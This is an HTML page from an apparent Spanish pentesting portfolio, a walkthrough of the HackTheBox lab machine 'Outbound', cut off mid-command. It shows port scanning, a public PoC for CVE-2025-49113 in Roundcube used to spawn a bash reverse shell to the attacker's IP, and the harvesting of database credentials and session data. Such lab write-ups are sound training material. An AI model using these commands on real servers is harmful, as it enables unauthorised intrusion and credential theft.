@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> | Mi Potafolio De Pentesting</title>
+    <style>
+        body {
+            background-color: #0f0f0f;
+            color: #c9d1d9;  
+            font-family: 'Courier New', Courier, monospace;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            max-width: 850px;
+            width: 100%;
+        }
+        header {
+            border-bottom: 2px solid #00ff41;
+            margin-bottom: 30px;
+            padding-bottom: 10px;
+        }
+        .back-link {
+            color: #00ff41;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+        h1 { color: #fff; margin: 10px 0; }
+        .meta { color: #888; font-size: 0.8em; margin-bottom: 20px; }
+        
+         
+        .content { background: #161b22; padding: 25px; border-radius: 5px; border: 1px solid #30363d; }
+        .content h2, .content h3 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 5px; }
+        
+         
+        pre {
+            background: #000;
+            padding: 15px;
+            border-left: 3px solid #00ff41;
+            overflow-x: auto;
+            color: #f8f8f2;
+        }
+        code { font-family: 'Consolas', monospace; color: #ff79c6; }
+        
+         
+        img { max-width: 100%; height: auto; border: 1px solid #00ff41; margin: 20px 0; }
+        
+        .tag { color: #0f0f0f; background: #00ff41; padding: 2px 8px; font-size: 0.7em; border-radius: 3px; margin-right: 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="/" class="back-link">&lt; Volver al índice</a>
+            <h1></h1>
+            <div class="meta">
+                <span>Fecha: 01/01/0001</span> | 
+                <span>Autor: Admin</span>
+            </div>
+            <div>
+                
+            </div>
+        </header>
+
+        <article class="content">
+            <p>Esta maquina de [[HackTheBox]] nos proporciona credenciales de Inicio de Sesión:</p>
+<p>Username: <strong>Tyler</strong>
+Password: <strong>LhKL1o9Nm3X2</strong></p>
+<p>Lo primero que vamos a hacer es una creación de la carpeta de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd /home/yoyan/maquina/
+</span></span><span style="display:flex;"><span>mkdir outbound
+</span></span><span style="display:flex;"><span>cd outbound
+</span></span><span style="display:flex;"><span>mkt
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span> content   exploits   nmap   scripts
+</span></span></code></pre></div><p>Esto es para tener las cosas organizadas y ordenadas</p>
+<hr>
+<h2 id="escaneo-de-puertos">Escaneo de Puertos</h2>
+<p>En este punto lo que vamos a realizar son un escaneo de los puertos que están activos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd nmap
+</span></span><span style="display:flex;"><span>nmap -p- --open --min-rate <span style="color:#ae81ff">5000</span> -vvv -sS -n -Pn <span style="color:#f92672">[</span>IP_OBJETIVO<span style="color:#f92672">]</span> -oG AllPorts
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Te creara un archivo grepable para usar despues el extractports</span>
+</span></span><span style="display:flex;"><span>extractPorts AllPorts
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Es un Script que te pone los puertos abierto en la Clipboard</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Una vez con los puertos realizamos un Escaneo mas Exhaustivo</span>
+</span></span><span style="display:flex;"><span>nmap -p22,80 -sCV <span style="color:#f92672">[</span>IP_OBJETIVO<span style="color:#f92672">]</span> -oN Target
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Te sale las versiones de los servicios de los puertos abiertos</span>
+</span></span></code></pre></div><p>Una vez visto los puertos abiertos y sus versiones podemos ver si son vulnerables o tienes algún <strong>CVE</strong> para realizar un ataque.</p>
+<p>Como vimos que el puerto 80 esta abierto hay una pagina web y con la dirección que nos aporto nmap <strong>mail.outbound.htb</strong> y que ponemos en el <code>/etc/hosts</code> vemos lo siguiente:</p>
+<p>![[Pasted image 20251122123634.png]]</p>
+<p>Probamos con las credenciales que nos aporto <strong>HTB</strong> y miramos si funciona tanto para el servicio de <strong>roundcube</strong> o para <strong>SSH</strong>.</p>
+<p>y con las credenciales de <strong>tyler:LhKL1o9Nm3X2</strong> podemos acceder a la pagina web.
+![[Pasted image 20251122123949.png]]
+Investigamos y podemos ver la versión del <strong>roundcube</strong> y miramos si existe una vulnerabilidad, también gracias al <strong>Wappalyzer</strong> podemos ver el lenguaje de programación que usaron para lanzar el <strong>roundcube</strong>.
+![[Pasted image 20251122124142.png]]</p>
+<p>Vemos que poniendo en el buscador <strong>Roundcube Webmail 1.6.10 exploit</strong> nos sale un github interesante, que nos habla de un exploit:
+![[Pasted image 20251122124538.png]]</p>
+<p>Esto nos proporciono al menos como se llama el <strong>CVE</strong> y con esto podemos encontrar uno para el mismo lenguaje de programación.
+![[Pasted image 20251122125010.png]]</p>
+<p>Y entramos a este y vemos que hace lo mismo pero con el lenguaje de programación <strong>PHP</strong> que esto nos puede dar menos problemas por una mejor compatibilidad.
+<a href="https://github.com/fearsoff-org/CVE-2025-49113">https://github.com/fearsoff-org/CVE-2025-49113</a></p>
+<p>Lo que realiza el script este es un [[Remote Code Execution]].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># Explicacion del codigo:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#php CVE-2025-49113.php http://10.10.11.77 [Username]  [Password] &#34;Código Ejecutable&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Lo que vamos a realizar nosotros es una Reverse Shell y la codificamos en Base64 para que no nos de problemas y escuchar con NetCat.</span>
+</span></span><span style="display:flex;"><span>php CVE-2025-49113.php http://mail.outbound.htb/ tyler <span style="color:#e6db74">&#39;LhKL1o9Nm3X2&#39;</span> <span style="color:#e6db74">&#34;echo &#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.15.110/4444 0&gt;&amp;1\&#34;&#39; | base64 | base64 -d | bash&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#En otra Terminal usamo NetCat</span>
+</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>Connection received on 10.10.11.77 <span style="color:#ae81ff">58080</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>248<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@mail:/var/www/html/roundcube/public_html$ 
+</span></span></code></pre></div><p>Y como podemso ver ya estamos dentro ponemos este comando para que la terminal que nos aporto se lo mas parecido posible a la nuestra y se mas manejable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@mail:/var/www/html/roundcube/public_html$ script /dev/null -c bash
+</span></span></code></pre></div><p>Ahora lo que nos ponemos a hacer es <strong>investigar por completo la maquina</strong> hasta encontrar algo que nos parezca interesante, una de las cosas que vimos con el <strong>Wappalyzer</strong> que nos puede interesar investigar es la <strong>base de datos</strong> y en los archivos <strong>config</strong>.</p>
+<p>En los Archivos del SQL pudimos ver las tablas que crean por defecto <strong>roundcube</strong>, entonces ahora procedemos a mirar los archivos <strong>config</strong> del programa <strong>roundcube</strong> para ver que podemos ver.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@mail:/var/www/html/roundcube/public_html/roundcube/config$ cat config.inc.php
+</span></span><span style="display:flex;"><span>&lt;be/public_html/roundcube/config$ cat config.inc.php                
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/*
+</span></span><span style="display:flex;"><span> +-----------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span> | Local configuration <span style="color:#66d9ef">for</span> the Roundcube Webmail installation.           |
+</span></span><span style="display:flex;"><span> |                                                                       |
+</span></span><span style="display:flex;"><span> | This is a sample configuration file only containing the minimum       |
+</span></span><span style="display:flex;"><span> | setup required <span style="color:#66d9ef">for</span> a functional installation. Copy more options       |
+</span></span><span style="display:flex;"><span> | from defaults.inc.php to this file to override the defaults.          |
+</span></span><span style="display:flex;"><span> |                                                                       |
+</span></span><span style="display:flex;"><span> | This file is part of the Roundcube Webmail client                     |
+</span></span><span style="display:flex;"><span> | Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> The Roundcube Dev Team                                  |
+</span></span><span style="display:flex;"><span> |                                                                       |
+</span></span><span style="display:flex;"><span> | Licensed under the GNU General Public License version <span style="color:#ae81ff">3</span> or            |
+</span></span><span style="display:flex;"><span> | any later version with exceptions <span style="color:#66d9ef">for</span> skins &amp; plugins.                |
+</span></span><span style="display:flex;"><span> | See the README file <span style="color:#66d9ef">for</span> a full license statement.                     |
+</span></span><span style="display:flex;"><span> +-----------------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>*/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$config <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Database connection string <span style="color:#f92672">(</span>DSN<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span> read+write operations
+</span></span><span style="display:flex;"><span>// Format <span style="color:#f92672">(</span>compatible with PEAR MDB2<span style="color:#f92672">)</span>: db_provider://user:password@host/database
+</span></span><span style="display:flex;"><span>// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
+</span></span><span style="display:flex;"><span>// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
+</span></span><span style="display:flex;"><span>// NOTE: <span style="color:#66d9ef">for</span> SQLite use absolute path <span style="color:#f92672">(</span>Linux<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;sqlite:////full/path/to/sqlite.db?mode=0646&#39;</span>
+</span></span><span style="display:flex;"><span>//       or <span style="color:#f92672">(</span>Windows<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;sqlite:///C:/full/path/to/sqlite.db&#39;</span>
+</span></span><span style="display:flex;"><span>$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;db_dsnw&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysql://roundcube:RCDBPass2025@localhost/roundcube&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// IMAP host chosen to perform the log-in.
+</span></span><span style="display:flex;"><span>// See defaults.inc.php <span style="color:#66d9ef">for</span> the option description.
+</span></span><span style="display:flex;"><span>$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;imap_host&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost:143&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// SMTP server host <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> sending mails<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>// See defaults.inc.php <span style="color:#66d9ef">for</span> the option description.
+</span></span><span style="display:flex;"><span>$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;smtp_host&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost:587&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// SMTP username <span style="color:#f92672">(</span><span style="color:#66d9ef">if</span> required<span style="color:#f92672">)</span> <span style="color:#66d9ef">if</span> you use %u as the username Roundcube
+</span></span><span style="display:flex;"><span>// will use the current username <span style="color:#66d9ef">for</span> login
+</span></span><span style="display:flex;"><span>$config<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;smtp_user&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;%u&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// SMTP password <span style="color:#f92672">(</span><span style="color:#66d9ef">if</span> required<span style="color:#f92672">)</span> <span style="color:#66d9ef">if</span> you use %p as the password Roundcube
+</span></span><span style="display:flex;"><span>// will use the current user<span style="color:#e6db74">&#39;s password for login
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$config[&#39;</span>smtp_pass<span style="color:#e6db74">&#39;] = &#39;</span>%p<span style="color:#e6db74">&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// provide an URL where a user can get support for this Roundcube installation
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$config[&#39;</span>support_url<span style="color:#e6db74">&#39;] = &#39;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// Name your service. This is displayed on the login screen and in the window title
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$config[&#39;</span>product_name<span style="color:#e6db74">&#39;] = &#39;</span>Roundcube Webmail<span style="color:#e6db74">&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// This key is used to encrypt the users imap password which is stored
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// in the session record. For the default cipher method it must be
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// exactly 24 characters long.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$config[&#39;</span>des_key<span style="color:#e6db74">&#39;] = &#39;</span>rcmail-!24ByteDESkey*Str<span style="color:#e6db74">&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// List of active plugins (in plugins/ directory)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$config[&#39;</span>plugins<span style="color:#e6db74">&#39;] = [
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;</span>archive<span style="color:#e6db74">&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;</span>zipdownload<span style="color:#e6db74">&#39;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">];
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">// skin name: folder from skins/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$config[&#39;</span>skin<span style="color:#e6db74">&#39;] = &#39;</span>elastic<span style="color:#e6db74">&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$config[&#39;</span>default_host<span style="color:#e6db74">&#39;] = &#39;</span>localhost<span style="color:#e6db74">&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$config[&#39;</span>smtp_server<span style="color:#e6db74">&#39;] = &#39;</span>localhost<span style="color:#960050;background-color:#1e0010">&#39;</span>;
+</span></span></code></pre></div><p>En las <strong>Líneas 24-30</strong> podemos ver las credenciales de la base de datos y el nombre de esta tambien, con ello podemos ejecutar lo siguiente y investigar si hay algo importante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql <span style="color:#f92672">-</span>u roundcube <span style="color:#f92672">-</span>pRCDBPass2025
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">show</span> databases;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Database</span>           <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> information_schema <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> roundcube          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span><span style="display:flex;"><span>use roundcube;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">show</span> tables;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">---------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Tables_in_roundcube <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">---------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">cache</span>               <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> cache_index         <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> cache_messages      <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> cache_shared        <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> cache_thread        <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> collected_addresses <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> contactgroupmembers <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> contactgroups       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> contacts            <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">dictionary</span>          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> filestore           <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> identities          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> responses           <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> searches            <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">session</span>             <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">system</span>              <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> users               <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">---------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--Investigamos las tablas mas relevantes.
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">--Sale client_hash que es un preferences.
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> identities;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">--No vemos nada en identities que sea relevante.
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">session</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------------------------------------------------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> sess_id                    <span style="color:#f92672">|</span> changed             <span style="color:#f92672">|</span> ip         <span style="color:#f92672">|</span> vars                                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------+---------------------+------------+----------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">6</span>a5ktqih5uca6lj8vrmgh9v0oh <span style="color:#f92672">|</span> <span style="color:#ae81ff">2025</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span> <span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">46</span>:<span style="color:#ae81ff">40</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">172</span>.<span style="color:#ae81ff">17</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">--Copiamos los archivos Vars y miramos si son importantes, ya que estan codificado en Base64
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOn